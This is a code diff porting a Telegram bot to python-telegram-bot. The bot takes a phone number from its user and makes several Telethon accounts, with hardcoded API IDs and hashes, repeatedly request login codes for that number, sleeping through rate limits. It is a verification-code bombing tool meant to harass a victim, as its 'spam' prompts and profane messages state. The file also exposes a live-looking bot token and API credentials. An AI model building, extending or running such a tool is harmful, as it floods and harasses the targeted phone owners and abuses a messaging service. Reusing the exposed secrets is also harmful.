@@ -1,8 +1,8 @@
-import re
-import telebot
-from telebot import types
-from telethon import TelegramClient, errors
 import asyncio
+import re
+from telethon import TelegramClient, errors
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
 TOKEN = "8978420835:AAHBaPWP0IGX4YHw1qawpE7nCoRXaK4Kxc4"
 ACCOUNTS = [
@@ -14,19 +14,14 @@ ACCOUNTS = [
     {"api_id": 38299331, "api_hash": "fb5e560c3bda2db7541770b2294ee137"}
 ]
 
-bot = telebot.TeleBot(TOKEN, threaded=False)
 user_states = {}
 clients = []
 
-def init_clients():
-    async def _init():
-        for acc in ACCOUNTS:
-            client = TelegramClient(None, acc["api_id"], acc["api_hash"])
-            await client.connect()
-            clients.append(client)
-    asyncio.run(_init())
-
-init_clients()
+async def init_clients():
+    for acc in ACCOUNTS:
+        client = TelegramClient(None, acc["api_id"], acc["api_hash"])
+        await client.connect()
+        clients.append(client)
 
 def clean_phone(phone):
     phone = re.sub(r'[^0-9+]', '', phone)
@@ -34,77 +29,90 @@ def clean_phone(phone):
         phone = '+' + phone
     return phone
 
-def send_codes_sync(chat_id, msg_id, phone):
-    async def send_codes():
-        log_msg = bot.send_message(chat_id, "Отправка начата...")
-        max_flood = 0
-        status_lines = []
+async def finish_flood(chat_id, msg_id, context):
+    kb = InlineKeyboardMarkup([[InlineKeyboardButton("spam", callback_data="spam")]])
+    await context.bot.edit_message_text("floodwait zakonchen mochesh dalshe spamit", chat_id, msg_id, reply_markup=kb)
+    if chat_id in user_states:
+        user_states[chat_id]["timer_task"] = None
 
-        async def send_one_client(client, idx):
-            nonlocal max_flood
-            sent = 0
-            for attempt in range(6):
-                while True:
-                    try:
-                        await client.send_code_request(phone)
-                        sent += 1
-                        break
-                    except errors.FloodWaitError as e:
-                        if e.seconds > max_flood:
-                            max_flood = e.seconds
-                        await asyncio.sleep(e.seconds)
-                    except Exception:
-                        break
-            return f"Акк{idx}: {sent}/6"
+async def flood_timer(chat_id, msg_id, seconds, context):
+    remaining = seconds
+    while remaining > 0:
+        await context.bot.edit_message_text(f"floodwait - {remaining}sekund", chat_id, msg_id)
+        await asyncio.sleep(1)
+        remaining -= 1
+    await finish_flood(chat_id, msg_id, context)
 
-        tasks = [send_one_client(client, i+1) for i, client in enumerate(clients)]
-        results = await asyncio.gather(*tasks)
-        bot.edit_message_text("\n".join(results), chat_id, log_msg.message_id)
-        bot.edit_message_text("gotovo tvoia mat viebana", chat_id, msg_id)
-        if max_flood > 0:
-            remaining = max_flood
-            while remaining > 0:
-                bot.edit_message_text(f"floodwait - {remaining}sekund", chat_id, msg_id)
-                asyncio.sleep(1)
-                remaining -= 1
-        kb = types.InlineKeyboardMarkup()
-        kb.add(types.InlineKeyboardButton("spam", callback_data="spam"))
-        bot.edit_message_text("floodwait zakonchen mochesh dalshe spamit", chat_id, msg_id, reply_markup=kb)
+async def send_codes(chat_id, msg_id, phone, context):
+    log_msg = await context.bot.send_message(chat_id, "Отправка начата...")
+    max_flood = 0
+    status_lines = []
+
+    async def send_one_client(client, idx):
+        nonlocal max_flood
+        sent = 0
+        for attempt in range(6):
+            while True:
+                try:
+                    await client.send_code_request(phone)
+                    sent += 1
+                    break
+                except errors.FloodWaitError as e:
+                    if e.seconds > max_flood:
+                        max_flood = e.seconds
+                    await asyncio.sleep(e.seconds)
+                except Exception:
+                    break
+        return f"Акк{idx}: {sent}/6"
+
+    tasks = [send_one_client(client, i+1) for i, client in enumerate(clients)]
+    results = await asyncio.gather(*tasks)
+    await context.bot.edit_message_text("\n".join(results), chat_id, log_msg.message_id)
+    await context.bot.edit_message_text("gotovo tvoia mat viebana", chat_id, msg_id)
+    if max_flood > 0:
+        task = asyncio.create_task(flood_timer(chat_id, msg_id, max_flood, context))
         if chat_id in user_states:
-            user_states[chat_id]["timer_task"] = None
+            user_states[chat_id]["timer_task"] = task
+    else:
+        await finish_flood(chat_id, msg_id, context)
 
-    asyncio.run(send_codes())
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    chat_id = update.effective_chat.id
+    kb = InlineKeyboardMarkup([[InlineKeyboardButton("spam", callback_data="spam")]])
+    sent = await update.message.reply_text("privet ueban chtob spamit nashmi vnizu (spam)", reply_markup=kb)
+    user_states[chat_id] = {"message_id": sent.message_id, "timer_task": None, "waiting_phone": False}
 
-@bot.message_handler(commands=['start'])
-def start(message):
-    chat_id = message.chat.id
-    kb = types.InlineKeyboardMarkup()
-    kb.add(types.InlineKeyboardButton("spam", callback_data="spam"))
-    sent = bot.reply_to(message, "privet ueban chtob spamit nashmi vnizu (spam)", reply_markup=kb)
-    user_states[chat_id] = {"message_id": sent.message_id, "waiting_phone": False}
-
-@bot.callback_query_handler(func=lambda call: call.data == "spam")
-def spam_callback(call):
-    chat_id = call.message.chat.id
+async def spam_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    chat_id = query.message.chat_id
     state = user_states.get(chat_id)
     if not state:
-        bot.answer_callback_query(call.id)
         return
-    bot.edit_message_text("napishi nomer", chat_id, state["message_id"])
+    if state.get("timer_task"):
+        state["timer_task"].cancel()
+        state["timer_task"] = None
+    await context.bot.edit_message_text("napishi nomer", chat_id, state["message_id"])
     state["waiting_phone"] = True
-    bot.answer_callback_query(call.id)
 
-@bot.message_handler(func=lambda message: True)
-def handle_phone(message):
-    chat_id = message.chat.id
+async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    chat_id = update.effective_chat.id
     state = user_states.get(chat_id)
     if not state or not state.get("waiting_phone"):
         return
-    phone = clean_phone(message.text)
+    phone = clean_phone(update.message.text)
     state["waiting_phone"] = False
-    bot.delete_message(chat_id, message.message_id)
-    send_codes_sync(chat_id, state["message_id"], phone)
+    await update.message.delete()
+    await send_codes(chat_id, state["message_id"], phone, context)
+
+async def main():
+    await init_clients()
+    app = Application.builder().token(TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CallbackQueryHandler(spam_callback, pattern="spam"))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone))
+    await app.bot.delete_webhook(drop_pending_updates=True)
+    await app.run_polling()
 
 if __name__ == "__main__":
-    bot.remove_webhook()
-    bot.polling(none_stop=True, interval=0)
+    asyncio.run(main())
